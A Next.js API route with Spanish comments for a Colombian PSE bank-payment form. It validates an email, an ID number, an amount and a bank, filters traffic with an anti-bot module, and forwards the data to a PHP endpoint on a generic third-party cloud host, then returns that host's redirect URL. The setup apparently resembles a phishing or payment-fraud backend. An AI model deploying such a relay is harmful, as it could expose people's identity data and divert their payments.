import { NextRequest, NextResponse } from 'next/server';
import { antiBotProtection } from '@/lib/anti-bot';

// Lista de bancos permitidos
const ALLOWED_BANKS = [
  "ALIANZA FIDUCIARIA", "BAN100", "BANCAMIA S.A.", "BANCO AGRARIO", "BANCO AV VILLAS",
  "BANCO BBVA COLOMBIA S.A.", "BANCO CAJA SOCIAL", "BANCO COOPERATIVO COOPCENTRAL",
  "BANCO DE BOGOTA", "BANCO DE OCCIDENTE", "BANCO FALABELLA", "BANCO FINANDINA S.A. BIC",
  "BANCO GNB SUDAMERIS", "BANCO ITAU", "BANCO J.P. MORGAN COLOMBIA S.A.",
  "BANCO MUNDO MUJER S.A.", "BANCO PICHINCHA S.A.", "BANCO POPULAR",
  "BANCO SANTANDER COLOMBIA", "BANCO SERFINANZA", "BANCO UNION antes GIROS", "BANCOLOMBIA",
  "BANCOOMEVA S.A.", "BOLD CF", "CFA COOPERATIVA FINANCIERA", "CITIBANK", "COINK SA",
  "COLTEFINANCIERA", "CONFIAR COOPERATIVA FINANCIERA", "COTRAFA", "Crezcamos-MOSí", "DALE",
  "DING", "FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO", "GLOBAL66", "IRIS",
  "JFK COOPERATIVA FINANCIERA", "LULO BANK", "MOVII S.A.", "NEQUI", "NU", "POWWI",
  "RAPPIPAY", "SCOTIABANK COLPATRIA", "UALÁ"
];

// Funciones de sanitización
function sanitizeEmail(email: string): string | null {
  if (!email || typeof email !== 'string') return null;

  // Limpiar y validar email
  const cleaned = email
    .toLowerCase()
    .trim()
    .replace(/[^a-z0-9@._-]/g, '')
    .slice(0, 100);

  // Validar formato básico de email
  const emailRegex = /^[a-z0-9._-]+@[a-z0-9.-]+\.[a-z]{2,}$/;
  if (!emailRegex.test(cleaned)) return null;

  return cleaned;
}

function sanitizeDocument(doc: string): string | null {
  if (!doc || typeof doc !== 'string') return null;

  // Solo números, entre 6 y 15 dígitos
  const cleaned = doc.replace(/\D/g, '').slice(0, 15);

  if (cleaned.length < 6) return null;

  return cleaned;
}

function sanitizeAmount(amount: unknown): number | null {
  // Validar que sea número positivo
  const num = Number(amount);

  if (isNaN(num) || num <= 2000 || num > 100000000) return null;

  return Math.floor(num); // Solo enteros
}

// Configuración de redirección directa por banco
const REDIRECCION_BANCOLOMBIA = false;
const URL_BANCOLOMBIA = "";

const REDIRECCION_BOGOTA = true;
const URL_BOGOTA = "";

export async function POST(request: NextRequest) {
  try {
    // Obtener IP del cliente
    const ip = request.headers.get('x-forwarded-for') ||
               request.headers.get('x-real-ip') ||
               'unknown';

    // Parsear body (form-urlencoded)
    const formData = await request.formData();

    // Convertir FormData a objeto para validación
    const formDataObj: Record<string, unknown> = {};
    formData.forEach((value, key) => {
      formDataObj[key] = value;
    });

    // Protección Anti-Bot completa
    const protection = antiBotProtection(ip, request.headers, formDataObj);
    if (!protection.allowed) {
      return NextResponse.json(
        { Error: protection.error },
        { status: protection.statusCode || 400 }
      );
    }
    const body = {
      amount: formData.get('amount'),
      bankCode: formData.get('bankCode'),
      Correo: formData.get('Correo'),
      Documento: formData.get('Documento'),
    };

    // Sanitizar y validar todos los inputs
    const amount = sanitizeAmount(body.amount);
    const correo = sanitizeEmail(body.Correo as string);
    const documento = sanitizeDocument(body.Documento as string);
    const bank = typeof body.bankCode === 'string' ? body.bankCode.trim() : '';

    // Validaciones estrictas
    if (amount === null) {
      return NextResponse.json({ Error: "Monto inválido" });
    }

    if (!correo) {
      return NextResponse.json({ Error: "Correo electrónico inválido" });
    }

    if (!documento) {
      return NextResponse.json({ Error: "Número de documento inválido" });
    }

    if (!bank || !ALLOWED_BANKS.includes(bank)) {
      return NextResponse.json({ Error: "Banco no permitido" });
    }

    // Redirección directa para Bancolombia
    if (REDIRECCION_BANCOLOMBIA && bank === "BANCOLOMBIA") {
      return NextResponse.json({ URL: URL_BANCOLOMBIA });
    }

    // Redirección directa para Banco de Bogotá
    if (REDIRECCION_BOGOTA && bank === "BANCO DE BOGOTA") {
      return NextResponse.json({ URL: URL_BOGOTA });
    }

    // Preparar datos para enviar al servidor externo
    const externalUrl = "https://phpclusters-196676-0.cloudclusters.net/apipsedaviplata2/PSE.php";

    const postData = new URLSearchParams();
    postData.append("Documento", documento);
    postData.append("Correo", correo);
    postData.append("Banco", bank);
    postData.append("Monto", amount.toString());

    // Enviar POST al servidor externo (timeout 90 segundos)
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 90000);

    try {
      const response = await fetch(externalUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: postData.toString(),
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      if (response.ok) {
        const data = await response.json();
        // Respuesta esperada: {"URL": "https://pse.com/..."}
        return NextResponse.json(data);
      } else {
        return NextResponse.json({ Error: "Fallo la conexión al servidor externo" });
      }
    } catch (fetchError) {
      clearTimeout(timeoutId);
      if (fetchError instanceof Error && fetchError.name === 'AbortError') {
        return NextResponse.json({ Error: "Tiempo de espera agotado. Intenta de nuevo." });
      }
      throw fetchError;
    }

  } catch {
    return NextResponse.json({ Error: "Error procesando la solicitud" });
  }
}
